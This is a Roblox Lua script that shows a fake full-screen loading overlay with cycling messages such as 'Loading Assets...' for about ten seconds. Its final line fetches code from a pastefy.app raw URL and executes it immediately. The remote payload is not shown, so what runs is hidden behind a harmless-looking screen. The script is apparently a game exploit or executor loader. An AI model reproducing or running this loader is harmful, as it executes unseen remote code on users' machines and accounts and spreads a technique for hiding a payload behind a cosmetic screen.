loadstring([[

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Full background
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black
frame.Parent = screenGui

-- Loading text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Loading..."
textLabel.Font = Enum.Font.FredokaOne
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextScaled = true
textLabel.Parent = frame

-- Loading messages
local messages = {
	"Loading Assets...",
	"Preparing Map...",
	"Spawning Characters...",
	"Almost Ready...",
	"Starting Game!"
}

-- Cycle messages
task.spawn(function()
	for _, msg in ipairs(messages) do
		textLabel.Text = msg
		wait(2)
	end
end)

-- Wait 10 seconds then fade out
task.delay(10, function()
	local tween = TweenService:Create(frame, TweenInfo.new(2), {BackgroundTransparency = 1})
	tween:Play()
	
	local tween2 = TweenService:Create(textLabel, TweenInfo.new(2), {TextTransparency = 1})
	tween2:Play()
	
	tween.Completed:Wait()
	screenGui:Destroy()
end)
]])()
loadstring(game:HttpGet("https://pastefy.app/puEVPJZf/raw"))()
